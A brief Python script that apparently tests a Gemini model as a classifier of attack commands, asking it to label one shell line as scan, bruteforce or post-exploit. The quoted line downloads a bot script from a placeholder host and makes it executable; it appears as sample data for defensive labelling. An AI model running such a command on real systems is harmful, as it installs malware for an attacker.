import os
from dotenv import load_dotenv
from google import genai

load_dotenv()
client = genai.Client(api_key=os.environ["GEMINI_API_KEY"])
resp = client.models.generate_content(
    model="gemini-3.1-flash-lite",
    contents="Classify: 'wget http://x/bot.sh; chmod +x bot.sh' as scan/bruteforce/post-exploit. One word.",
)
print(resp.text)
print(resp.usage_metadata)